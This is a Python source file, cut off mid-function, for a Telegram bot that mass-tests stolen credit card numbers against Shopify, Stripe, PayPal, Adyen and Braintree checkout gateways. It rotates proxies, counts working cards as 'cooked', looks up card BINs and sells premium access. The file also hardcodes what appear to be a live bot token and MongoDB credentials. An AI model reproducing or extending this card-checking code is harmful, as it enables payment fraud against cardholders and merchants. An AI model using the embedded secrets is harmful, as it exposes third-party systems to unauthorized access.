import os
import re
import json
import random
import time
import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import threading
import functools
import uuid
import html
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socket
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback
import gates
from pymongo import MongoClient

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
socket.setdefaulttimeout(30)
from collections import Counter
import logging
logger = logging.getLogger(__name__)
from complete_handler import setup_complete_handler, get_bin_info
from gates import check_shopify_api, process_shopify_api_response
from gates import (
    check_chaos,
    check_adyen,
    check_app_auth,
    check_stripe_onyx,
    check_arcenus,
    check_paypal_onyx,
    # Aliases for command mapping
    check_paypal_fixed,
    check_paypal_general,
    check_stripe_api,
    check_b3_auth,
)
BOT_TOKEN = "8395369201:AAEUhgZ9pwsVr3E7uWS_Q0Tr91lKAPzT568"
OWNER_ID = [5963548505, 1614278744]
DARKS_ID = 5963548505

# Increase thread pool to 100 to handle multiple users simultaneously without freezing
bot = telebot.TeleBot(BOT_TOKEN, num_threads=30) 

CCS_FILE = 'data/credit_cards.json'
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"
SETTINGS_FILE = "settings.json"
USERS_FILE = "users.json"
GROUPS_FILE = "groups.json"
BOT_START_TIME = time.time()
USER_PROXIES_FILE = "user_proxies.json"
CODES_FILE = "codes.json"
USER_SITES_FILE = "user_sites.json"

def load_user_sites():
    return load_json(USER_SITES_FILE, {})

def save_user_sites(data):
    save_json(USER_SITES_FILE, data)

def get_user_sites(user_id):
    data = load_user_sites()
    return data.get(str(user_id), [])

def save_user_sites_list(user_id, sites_list):
    data = load_user_sites()
    data[str(user_id)] = sites_list
    save_user_sites(data)

# User session storage (in-memory)
user_sessions = {}
# Price filter setting (default: no filter)
price_filter = None

# Flood control dictionary
user_last_command = {}

# Response categories for /listsite filtering
RESPONSE_CATEGORIES = {
    1: { 'name': 'GENERIC_ERROR', 'keywords': ['ERROR'] },
    2: { 'name': 'DECLINED', 'keywords': ['DECLINED'] },
    3: { 'name': 'CAPTCHA_REQUIRED', 'keywords': ['CAPTCHA'] },
    4: { 'name': 'FRAUD_SUSPECTED', 'keywords': ['FRAUD'] },
    5: { 'name': 'INCORRECT_CVC', 'keywords': ['INCORRECT CVC', 'CVC'] },
    6: { 'name': 'INCORRECT_ZIP', 'keywords': ['INCORRECT ZIP', 'ZIP'] },
    7: { 'name': 'INSUFFICIENT_FUNDS', 'keywords': ['INSUFFICIENT FUNDS', 'FUNDS'] },
    # Add more as needed
}
# Single‑check CAPTCHA site ban (shared across all users)
single_site_ban = {}
single_site_ban_lock = threading.Lock()
SINGLE_BAN_TIME = 300          # 5 minutes
MAX_SINGLE_ATTEMPTS = 3        # Try only 3 sites per /sh
SINGLE_SITES_FILE = "single_sites.json"
# ============================================================================
# FORCE SUBSCRIBE SETUP
# ============================================================================
REQUIRED_CHATS = ["@Nova_bot_update", "-1001980699196"]

def is_subscribed(user_id):
    if not REQUIRED_CHATS:
        return True
    for chat_id in REQUIRED_CHATS:
        try:
            member = bot.get_chat_member(chat_id, user_id)
            if member.status not in ['creator', 'administrator', 'member']:
                return False
        except Exception as e:
            print(f"Force subscribe check error for {chat_id}: {e}")
            return False
    return True

# ============================================================================
# RATE LIMITER (prevents 429 errors)
# ============================================================================
class RateLimiter:
    def __init__(self, max_calls=25, period=1.0):
        self.max_calls = max_calls
        self.period = period
        self.calls = []
        self.lock = threading.Lock()

    def wait(self):
        with self.lock:
            now = time.time()
            # Remove calls older than period
            self.calls = [t for t in self.calls if t > now - self.period]
            if len(self.calls) >= self.max_calls:
                sleep_time = self.calls[0] + self.period - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(time.time())

rate_limiter = RateLimiter()

def safe_send(bot_func, *args, **kwargs):
    """Wrapper to apply rate limiting before any bot API call."""
    rate_limiter.wait()
    return bot_func(*args, **kwargs)
# ============================================================================
# MONGODB CLOUD STORAGE INTEGRATION
# ============================================================================
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import requests

uri = "mongodb://rahll_db_user:k0RRXUHqnXMgsCJx@ac-cf1jjpz-shard-00-00.aom0bxs.mongodb.net:27017,ac-cf1jjpz-shard-00-01.aom0bxs.mongodb.net:27017,ac-cf1jjpz-shard-00-02.aom0bxs.mongodb.net:27017/?ssl=true&replicaSet=atlas-z75igo-shard-0&authSource=admin&appName=Cluster0"
client = MongoClient(
    uri,
    server_api=ServerApi('1'),
    maxPoolSize=5,               # Prevent connection exhaustion
    connectTimeoutMS=30000,       # 30s to connect
    socketTimeoutMS=45000,         # 45s for operations
    serverSelectionTimeoutMS=30000 # 30s to select server
)

try:
    client.admin.command('ping')
    db = client['nova_bot_db']    # <-- CRITICAL: define db
    print("✅ Successfully connected to MongoDB!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    client = None
    db = None

# Get current outbound IP (for debugging)
try:
    ip = requests.get('https://api.ipify.org', timeout=10).text
    print(f"🌐 Current outbound IP: {ip}")
except:
    print("⚠️ Could not fetch IP")

# ============================================================================
# JSON HELPERS (MongoDB + local fallback)
# ============================================================================
def load_json_local(file_path, default_data):
    """Original local file loader – used as fallback."""
    try:
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            # Validate structure for known files
            if file_path == SITES_FILE:
                if isinstance(data, dict) and 'sites' in data:
                    return data
                elif isinstance(data, list):
                    return {"sites": data}
                else:
                    return {"sites": []}
            elif file_path == PROXIES_FILE:
                if isinstance(data, dict) and 'proxies' in data:
                    return data
                elif isinstance(data, list):
                    return {"proxies": data}
                else:
                    return {"proxies": []}
            elif file_path == STATS_FILE:
                if not isinstance(data, dict):
                    data = {}
                for key in ['approved', 'declined', 'cooked', 'mass_approved', 'mass_declined', 'mass_cooked', 'error', 'mass_error']:
                    data.setdefault(key, default_data.get(key, 0))
                return data
            elif file_path == SETTINGS_FILE:
                return data if isinstance(data, dict) else {"price_filter": None}
            elif file_path in [USERS_FILE, GROUPS_FILE, USER_PROXIES_FILE, CODES_FILE]:
                return data if isinstance(data, dict) else {}
            return data
        else:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2)
            return default_data
    except Exception as e:
        print(f"Error loading local {file_path}: {e}")
        return default_data

def load_json(file_path, default_data):
    """Load data from MongoDB if available, otherwise fallback to local file."""
    global db
    if db is None:
        return load_json_local(file_path, default_data)
    try:
        collection_name = file_path.replace('.json', '').replace('data/', '').replace('/', '_')
        # Try to find document with _id "main_data"
        doc = db[collection_name].find_one({"_id": "main_data"})
        if not doc:
            # If not found, get the first document in the collection
            doc = db[collection_name].find_one()
        if not doc:
            return default_data

        # Extract data – either from 'data' field or entire document minus _id
        if 'data' in doc:
            data = doc['data']
        else:
            data = {k: v for k, v in doc.items() if k != '_id'}

        # Validate structure for known files
        if file_path == SITES_FILE:
            if isinstance(data, dict) and 'sites' in data:
                return data
            elif isinstance(data, list):
                return {"sites": data}
            else:
                return {"sites": []}
        elif file_path == PROXIES_FILE:
            if isinstance(data, dict) and 'proxies' in data:
                return data
            elif isinstance(data, list):
                return {"proxies": data}
            else:
                return {"proxies": []}
        elif file_path == STATS_FILE:
            if not isinstance(data, dict):
                data = {}
            for key in ['approved', 'declined', 'cooked', 'mass_approved', 'mass_declined', 'mass_cooked', 'error', 'mass_error']:
                data.setdefault(key, default_data.get(key, 0))
            return data
        elif file_path == SETTINGS_FILE:
            return data if isinstance(data, dict) else {"price_filter": None}
        elif file_path in [USERS_FILE, GROUPS_FILE, USER_PROXIES_FILE, CODES_FILE]:
            return data if isinstance(data, dict) else {}
        return data
    except Exception as e:
        print(f"⚠️ MongoDB Load Error ({file_path}): {e}")
        return load_json_local(file_path, default_data)

def save_json(file_path, data):
    """Save data to MongoDB if available, otherwise to local file."""
    global db
    if db is not None:
        try:
            collection_name = file_path.replace('.json', '').replace('data/', '').replace('/', '_')
            db[collection_name].update_one(
                {"_id": "main_data"},
                {"$set": {"data": data}},
                upsert=True
            )
            return True
        except Exception as e:
            print(f"⚠️ MongoDB Save Error ({file_path}): {e}")
            # fallback to local
    # Local save
    try:
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"Error saving local {file_path}: {e}")
        return False

# ============================================================================
# REFERRAL SYSTEM & NAME CHECK
# ============================================================================
REFERRALS_FILE = "referrals.json"
referrals_data = load_json(REFERRALS_FILE, {})

def get_referral_link(user_id):
    return f"https://t.me/Nova_V4bot?start=ref_{user_id}"

def add_referral(referrer_id, new_user_id):
    referrer = str(referrer_id)
    new_user = str(new_user_id)
    if referrer == new_user:
        return False
    if referrer not in referrals_data:
        referrals_data[referrer] = {"referred": [], "reward_claimed": 0}
    if new_user not in referrals_data[referrer]["referred"]:
        referrals_data[referrer]["referred"].append(new_user)
        save_json(REFERRALS_FILE, referrals_data)
        total_refs = len(referrals_data[referrer]["referred"])
        rewards_earned = total_refs // 3
        if rewards_earned > referrals_data[referrer].get("reward_claimed", 0):
            days_to_add = (rewards_earned - referrals_data[referrer]["reward_claimed"]) * 1
            referrals_data[referrer]["reward_claimed"] = rewards_earned
            save_json(REFERRALS_FILE, referrals_data)
            # Add premium days
            if referrer in users_data:
                try:
                    cur = datetime.fromisoformat(users_data[referrer]['expiry'])
                    if cur < datetime.now():
                        cur = datetime.now()
                    new_exp = cur + timedelta(days=days_to_add)
                except:
                    new_exp = datetime.now() + timedelta(days=days_to_add)
            else:
                new_exp = datetime.now() + timedelta(days=days_to_add)
            users_data[referrer] = {
                "expiry": new_exp.isoformat(),
                "limit": users_data.get(referrer, {}).get("limit", 1000),
                "usage_today": users_data.get(referrer, {}).get("usage_today", 0),
                "daily_limit": users_data.get(referrer, {}).get("daily_limit", 10000)
            }
            save_json(USERS_FILE, users_data)
            try:
                bot.send_message(referrer, f"🎉 <b>Referral Reward!</b>\nYou earned {days_to_add} day(s) premium for {total_refs} referrals!", parse_mode='HTML')
            except: pass
        return True
    return False
    


def has_required_username(user):
    required = "@Nova_V4bot"
    first = user.first_name or ""
    last = user.last_name or ""
    return required.lower() in first.lower() or required.lower() in last.lower()
    
def force_subscribe_and_name(func):
    @functools.wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        user = message.from_user
        chat_type = message.chat.type

        # 0. Owner bypass
        if user_id in OWNER_ID:
            return func(message)

        # 1. Check subscription to all required chats
        if not is_subscribed(user_id):
            markup = types.InlineKeyboardMarkup()
            btn1 = types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/Nova_bot_update")
            btn2 = types.InlineKeyboardButton("👥 Join Group", url="https://t.me/+d4FuWKR6Ni9lNTdl")
            btn3 = types.InlineKeyboardButton("🔄 I've Joined Both", callback_data="check_subscription")
            markup.add(btn1, btn2)
            markup.add(btn3)
            prompt = f"""
<pre>┌─────────────────────────────────┐
│         🔒  ACCESS  DENIED       │
└─────────────────────────────────┘</pre>

<b>⚠️ You must join BOTH our channel and group to use this bot.</b>

📢 <b>Channel:</b> @Nova_bot_update
👥 <b>Group:</b> @novabot_group

<i>After joining both, click the button below to verify.</i>
"""
            bot.reply_to(message, prompt, parse_mode='HTML', reply_markup=markup)
            return

        # 2. Name requirement – only for PRIVATE chats and FREE users
        if chat_type == 'private':
            user_str = str(user_id)
            is_premium = False
            if user_str in users_data:
                try:
                    expiry = datetime.fromisoformat(users_data[user_str]['expiry'])
                    if expiry > datetime.now():
                        is_premium = True
                except:
                    pass

            if not is_premium and not has_required_username(user):
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("📋 How to Fix", callback_data="help_name_requirement"))
                prompt = f"""
<pre>┌─────────────────────────────────┐
│         🚫  NAME  REQUIRED       │
└─────────────────────────────────┘</pre>

<b>⚠️ Free users must add <code>@Nova_V4bot</code> to their Telegram name to use the bot in private chat.</b>

👉 <b>Steps:</b>
1️⃣ Go to Settings → Edit Profile
2️⃣ Add <code>@Nova_V4bot</code> to your First or Last name
3️⃣ Come back and try again

💡 <b>Premium users are exempt.</b>
💡 <b>In groups, no name requirement.</b>
"""
                bot.reply_to(message, prompt, parse_mode='HTML', reply_markup=markup)
                return

        return func(message)
    return wrapper

def cleanup_expired_users():
    now = datetime.now()
    to_remove = []
    for uid, data in users_data.items():
        try:
            expiry = datetime.fromisoformat(data.get('expiry', '2000-01-01'))
            if expiry <= now:
                to_remove.append(uid)
        except:
            to_remove.append(uid)
    for uid in to_remove:
        del users_data[uid]
    if to_remove:
        save_json(USERS_FILE, users_data)
        print(f"🧹 Removed {len(to_remove)} expired users")
# Load data with proper structure validation
# Default stats
default_stats = {
    "approved": 0, "declined": 0, "cooked": 0,
    "mass_approved": 0, "mass_declined": 0, "mass_cooked": 0
}

# Load data
sites_data = load_json(SITES_FILE, {"sites": []})
if isinstance(sites_data, list):
    sites_data = {"sites": sites_data}
elif not isinstance(sites_data, dict) or 'sites' not in sites_data:
    sites_data = {"sites": []}

proxies_data = load_json(PROXIES_FILE, {"proxies": []})
if isinstance(proxies_data, list):
    proxies_data = {"proxies": proxies_data}
elif not isinstance(proxies_data, dict) or 'proxies' not in proxies_data:
    proxies_data = {"proxies": []}

stats_data = load_json(STATS_FILE, default_stats)
settings_data = load_json(SETTINGS_FILE, {"price_filter": None})
users_data = load_json(USERS_FILE, {})
cleanup_expired_users()
groups_data = load_json(GROUPS_FILE, {})
user_proxies_data = load_json(USER_PROXIES_FILE, {})
codes_data = load_json(CODES_FILE, {"codes": {}})
single_sites_data = load_json(SINGLE_SITES_FILE, {"sites": []})

# Load and migrate user sites with IDs
user_sites_data = load_json(USER_SITES_FILE, {})
for user_id, sites in user_sites_data.items():
    next_id = 1
    for site in sites:
        if 'id' not in site:
            site['id'] = next_id
            next_id += 1
        else:
            if site['id'] >= next_id:
                next_id = site['id'] + 1
save_json(USER_SITES_FILE, user_sites_data)

price_filter = settings_data.get("price_filter")
CCS_FILE = 'data/credit_cards.json'

def get_user_proxies(user_id):
    """Return list of personal proxies for a user."""
    return user_proxies_data.get(str(user_id), [])

def load_ccs_data():
    """Load credit cards from file"""
    try:
        with open(CCS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'credit_cards': [], 'last_updated': None}

# Initialize CC data
ccs_data = load_ccs_data()

status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐂𝐨𝐨𝐤𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}


# Check if user is owner
def is_owner(user_id):
    return user_id in OWNER_ID

# Check if user is approved
def is_approved(user_id):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        expiry_date = datetime.fromisoformat(users_data[user_id_str]['expiry'])
        return expiry_date > datetime.now()
    return False

# Check if group is approved
def is_group_approved(chat_id):
    chat_id_str = str(chat_id)
    return chat_id_str in groups_data

# Flood control decorator
def flood_control(func):
    @functools.wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # No flood control for owners
        if is_owner(user_id):
            return func(message)
            
        # Check if user is approved (no flood control for approved users)
        if is_approved(user_id):
            return func(message)
        
        # Check if it's a group and group is approved (no flood control in approved groups)
        if chat_type in ['group', 'supergroup'] and is_group_approved(message.chat.id):
            return func(message)
        
        # Flood control for others
        current_time = time.time()
        if user_id in user_last_command:
            time_diff = current_time - user_last_command[user_id]
            if time_diff < 10:  # 10 seconds flood wait
                wait_time = 10 - int(time_diff)
                bot.reply_to(message, f"⏳ Please wait {wait_time} seconds before using another command.")
                return
        
        user_last_command[user_id] = current_time
        return func(message)
    return wrapper

# Check access control
def check_access(func):
    @functools.wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Always allow owners
        if is_owner(user_id):
            return func(message)
        
        # Check if it's a private chat
        if chat_type == 'private':
            if not is_approved(user_id):
                bot.reply_to(message, "🚫 <b>Access Denied!</b>\n\nThis bot is locked for private messages.\nPlease contact the owner for access.\n\nYou Can use here : https://t.me/+d4FuWKR6Ni9lNTdl", parse_mode='HTML')
                return
        
        # Check if it's a group
        elif chat_type in ['group', 'supergroup']:
            if not is_group_approved(message.chat.id):
                bot.reply_to(message, "🚫 <b>Group Not Approved!</b>\n\nThis group is not authorized to use this bot.\nPlease contact the owner for approval. \n\n  Owner @Unknown_bolte", parse_mode='HTML')
                return
        
        # Check if user is approved (for groups)
        elif not is_approved(user_id):
            bot.reply_to(message, "🚫 <b>User Not Approved!</b>\n\nYou are not authorized to use this bot.\nPlease contact the owner for access.You Can use here : https://t.me/+d4FuWKR6Ni9lNTdl", parse_mode='HTML')
            return
        
        return func(message)
    return wrapper

# Ensure every site has a unique ID
if 'sites' in sites_data:
    next_id = 1
    for site in sites_data['sites']:
        if 'id' not in site:
            site['id'] = next_id
            next_id += 1
        else:
            # Keep track of max existing ID
            if site['id'] >= next_id:
                next_id = site['id'] + 1
    save_json(SITES_FILE, sites_data)

def get_next_site_id():
    """Return the next available site ID (max existing + 1)."""
    if not sites_data.get('sites'):
        return 1
    max_id = max((site.get('id', 0) for site in sites_data['sites']), default=0)
    return max_id + 1

def get_next_user_site_id(user_id):
    user_sites = get_user_sites(user_id)
    if not user_sites:
        return 1
    return max(site.get('id', 0) for site in user_sites) + 1


# Extract CC from various formats
def extract_cc(text):
    # Remove any non-digit characters except |, :, ., /, and space
    cleaned = re.sub(r'[^\d|:./ ]', '', text)
    
    # Handle various formats
    if '|' in cleaned:
        parts = cleaned.split('|')
    elif ':' in cleaned:
        parts = cleaned.split(':')
    elif '.' in cleaned:
        parts = cleaned.split('.')
    elif '/' in cleaned:
        parts = cleaned.split('/')
    else:

        if len(cleaned) >= 16:
            cc = cleaned[:16]
            rest = cleaned[16:]
            if len(rest) >= 4:
                mm = rest[:2]
                rest = rest[2:]
                if len(rest) >= 4:
                    yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                    rest = rest[4:] if len(rest) >= 4 else rest[2:]
                    if len(rest) >= 3:
                        cvv = rest[:3]
                        parts = [cc, mm, yyyy, cvv]
    
    if len(parts) < 4:
        return None
    
    # Standardize the format
    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)  # Ensure 2-digit month
    yyyy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle 2-digit year - FIXED LOGIC
    if len(yyyy) == 2:
        current_year_short = datetime.now().year % 100
        year_int = int(yyyy)
        # If 2-digit year is less than or equal to current year, assume 2000s
        # Otherwise assume 1900s (for expired cards)
        yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
    
    return f"{cc}|{mm}|{yyyy}|{cvv}"

# Extract multiple CCs from text
def extract_multiple_ccs(text):
    # Split by newlines or other common separators
    lines = re.split(r'[\n\r,;]+', text)
    ccs = []
    
    for line in lines:
        cc = extract_cc(line)
        if cc:
            ccs.append(cc)
    
    return ccs

def create_session_with_retries():
    """Create a requests session with retry strategy and longer timeouts"""
    session = requests.Session()
    
    # Configure retry strategy with longer timeouts
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"],
        backoff_factor=1
    )
    
    # Mount adapters with retry strategy
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=10,
        pool_maxsize=10
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def is_valid_response(response):
    if not response:
        return False
    
    response_upper = response.get("Response", "").upper()

    return any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                           'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                           'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , "INCORRECT_NUMBER" , "INVALID_TOKEN" , "AUTHENTICATION_ERROR"])


# ============================================================================
# 🔐 USER AUTHORIZATION
# ============================================================================

def is_user_allowed(userid):
    """Complete handler auth - owners + approved users"""
    # 1. Check Owner
    if userid in OWNER_ID:
        return True
    
    # 2. Check Database
    try:
        userdata = users_data.get(str(userid))
        if not userdata:
            return False
            
        # FIX: Check both 'expiry' (from /pro) and 'expiry_date' (legacy)
        expiry_date_str = userdata.get('expiry') or userdata.get('expiry_date')
        
        if not expiry_date_str:
            return False
            
        expiry_date = datetime.fromisoformat(expiry_date_str)
        return datetime.now() <= expiry_date
    except:
        return False


# ============================================================================
# 1. READ FILE DIRECTLY FROM TELEGRAM (NO DOWNLOAD)
# ============================================================================

def read_telegram_file_to_memory(bot, file_id):
    """
    Read file directly into memory without saving to disk
    Returns: file content as string
    """
    try:
        file_info = bot.get_file(file_id)
        file_bytes = bot.download_file(file_info.file_path)
        content = file_bytes.decode('utf-8', errors='ignore')
        return content
    except Exception as e:
        logger.error(f"❌ File read error: {e}")
        return None


# ============================================================================
# 2. EXTRACT CCs FROM TEXT (MEMORY-BASED)
# ============================================================================

def extract_ccs_from_text(text):
    """
    Extract credit cards from text in format: CC|MM|YYYY|CVV
    Returns: list of CC strings
    """
    valid_ccs = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        parts = line.split('|')
        if len(parts) != 4:
            continue
        
        cc, mm, yyyy, cvv = parts
        
        # Validate CC (13-19 digits)
        if not cc.isdigit() or not (13 <= len(cc) <= 19):
            continue
        
        # Validate MM (01-12)
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            continue
        
        # Validate YYYY (4 digits, reasonable year)
        if not yyyy.isdigit() or len(yyyy) != 4:
            continue
        
        # Validate CVV (3-4 digits)
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            continue
        
        valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    
    return valid_ccs


# ============================================================================
# 3. ANALYZE CCs FOR DUPLICATES & BIN PATTERNS
# ============================================================================

def analyze_cc_patterns(ccs):
    """
    Analyze CCs for:
    - Unique BINs (first 6 digits)
    - Duplicate detection
    - Distribution stats
    """
    if not ccs:
        return None
    
    bins = [cc.split('|')[0][:6] for cc in ccs]
    bin_counter = Counter(bins)
    
    unique_bins = len(set(bins))
    max_duplicate = max(bin_counter.values())
    duplicate_percent = (max_duplicate / len(ccs)) * 100
    
    stats = {
        'total_ccs': len(ccs),
        'unique_bins': unique_bins,
        'max_duplicate': max_duplicate,
        'duplicate_percent': round(duplicate_percent, 1),
        'bin_distribution': dict(sorted(bin_counter.items(), key=lambda x: x[1], reverse=True)[:10])
    }
    
    log_msg = f"🔍 {unique_bins} unique BINs | Max duplicate: {max_duplicate} ({duplicate_percent:.0f}%)"
    logger.info(log_msg)
    
    return stats


# ============================================================================
# 4. GET BIN INFO (FROM YOUR CODE)
# ============================================================================

def get_bin_info_api(card_number):
    """
    Fetch BIN information ONLY from anti-public.cc API.
    Returns dict with keys: country_name, country_flag, brand, type, level, bank.
    """
    import re
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]

    default_info = {
        'country_name': 'Unknown',
        'country_flag': '🇺🇳',
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN'
    }

    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('level', 'UNKNOWN'),
                'bank': data.get('bank', 'UNKNOWN')
            }
    except:
        pass

    return default_info


# ============================================================================
# 5. CONCURRENT CARD CHECKING (FAST)
# ============================================================================

def check_card_concurrent(cc, filtered_sites, proxy, check_function, max_retries=3):
    """
    Check single card with max 3 sites concurrently
    Returns when first APPROVED found or all sites tried
    
    Args:
        cc: CC string (CC|MM|YYYY|CVV)
        filtered_sites: List of available sites
        proxy: Proxy to use
        check_function: Your existing check_site function
        max_retries: Max sites to try per card (default 3)
    
    Returns: dict with result
    """
    try:
        # Pick random 3 sites to try
        sites_to_try = random.sample(filtered_sites, min(max_retries, len(filtered_sites)))
        
        for site_obj in sites_to_try:
            try:
                site_url = site_obj['url']
                site_name = site_obj.get('name', site_url)
                price = site_obj.get('price', '0.00')
                gateway = site_obj.get('gateway', 'Unknown')
                
                # Call your existing check_site function
                api_response = check_function(site_url, cc, proxy)
                
                # Get bin info from your code
                bin_info = get_bin_info_from_api(cc.split('|')[0])
                
                # Process response using your existing logic
                response, status, gateway_result = process_shopify_api_response(api_response, price)
                
                # If valid response, return immediately
                if is_valid_response(api_response):
                    return {
                        'cc': cc,
                        'response': response,
                        'status': status,
                        'gateway': gateway_result or gateway,
                        'price': price,
                        'site': site_name,
                        'site_url': site_url,
                        'bin_info': bin_info,
                        'timestamp': datetime.now().isoformat()
                    }
                
                time.sleep(0.05)  # Small delay between sites
                
            except requests.Timeout:
                continue
            except Exception as e:
                logger.error(f"Check error for {cc}: {e}")
                continue
        
        # If no site worked, return error result
        return {
            'cc': cc,
            'response': 'All sites failed',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': 'No valid response',
            'site_url': 'N/A',
            'bin_info': get_bin_info_from_api(cc.split('|')[0]),
            'timestamp': datetime.now().isoformat()
        }
    
    except Exception as e:
        logger.error(f"Card check failed: {e}")
        return {
            'cc': cc,
            'response': str(e),
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': 'Error',
            'site_url': 'N/A',
            'bin_info': get_bin_info_from_api(cc.split('|')[0]),
            'timestamp': datetime.now().isoformat()
        }


# ============================================================================
# 6. MAIN MASS CHECK FUNCTION - CONCURRENT
# ============================================================================
def process_mass_gate_check(bot, message, ccs, gate_func, gate_name):
    """
    Generic mass check for specific API gates (PayPal, Stripe, etc)
    """
    total_ccs = len(ccs)
    results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
    
    start_time = time.time()
    last_update = time.time()
    processed_count = 0
    
    status_msg = bot.send_message(
        message.chat.id,
        f"🔥 <b>MASS {gate_name} STARTED</b>\n⏳ Checking {total_ccs} cards...",
        parse_mode='HTML'
    )
    
    # Use ThreadPool for speed
    with ThreadPoolExecutor(max_workers=5) as executor: # Lower workers for API safety
        futures = {}
        for cc in ccs:
            proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
            # Submit task: gate_func(cc, proxy)
            future = executor.submit(gate_func, cc, proxy)
            futures[future] = cc
            
        for future in as_completed(futures):
            cc = futures[future]
            try:
                response_text, status = future.result()
                
                # Get Bin Info
                bin_info = get_bin_info_api(cc.split('|')[0])
                
                result_obj = {
                    'cc': cc,
                    'response': response_text,
                    'status': status,
                    'gateway': gate_name,
                    'price': 'Auth/Charge',
                    'site': 'API',
                    'bin_info': bin_info
                }

                if status == 'APPROVED':
                    results['cooked'].append(result_obj)
                    update_stats('COOKED', mass_check=True)
                elif status == 'DECLINED':
                    results['declined'].append(result_obj)
                    update_stats('DECLINED', mass_check=True)
                else:
                    results['error'].append(result_obj)
                    update_stats('ERROR', mass_check=True)
                
                processed_count += 1
                
                # Update UI every 2 seconds
                if time.time() - last_update > 2:
                    bot.edit_message_text(
                        f"┏━━━━━━━⍟\n┃ <b>MASS {gate_name}</b>\n┗━━━━━━━━━━━⊛\n\n"
                        f"<b>Progress:</b> {processed_count}/{total_ccs}\n"
                        f"✅ Live: {len(results['cooked'])}\n"
                        f"❌ Die: {len(results['declined'])}",
                        message.chat.id,
                        status_msg.message_id,
                        parse_mode='HTML'
                    )
                    last_update = time.time()
                    
            except Exception as e:
                processed_count += 1
                
    # Final Report
    duration = time.time() - start_time
    bot.send_message(
        message.chat.id,
        f"✅ <b>{gate_name} Check Complete</b>\n"
        f"Total: {total_ccs} | Time: {duration:.2f}s\n"
        f"✅ Live: {len(results['cooked'])}\n"
        f"❌ Dead: {len(results['declined'])}",
        parse_mode='HTML'
    )
    
    # Send Hits
    if results['cooked']:
        msg = format_cooked_cards_detailed(results['cooked'])
        if len(msg) > 4000:
             with open("hits.txt", "w") as f: f.write(msg)
             with open("hits.txt", "rb") as f: bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, msg, parse_mode='HTML')

def process_mass_check_txt(bot, message, ccs, filtered_sites, proxies_data, check_function, is_valid_response, process_response, update_stats):
    """
    Mass check CCs from TXT file with concurrent processing
    
    Args:
        bot: TeleBot instance
        message: Telegram message object
        ccs: List of CC strings (CC|MM|YYYY|CVV)
        filtered_sites: Filtered sites based on price
        proxies_data: Proxy dictionary {'proxies': [...]}
        check_function: Your existing check_site function
        is_valid_response: Your response validation function
        process_response: Your response processing function
        update_stats: Your stats update function
    """
    total_ccs = len(ccs)
    results = {
        'cooked': [],
        'approved': [],
        'declined': [],
        'error': [],
        'timeout': []
    }
    
    start_time = time.time()
    last_update = time.time()
    processed_count = 0
    
    try:
        # Send initial message
        status_msg = bot.send_message(
            message.chat.id,
            "🔥 <b>MASS CHECK STARTED</b>\n⏳ Initializing concurrent checking...",
            parse_mode='HTML'
        )
        
        # Get proxy
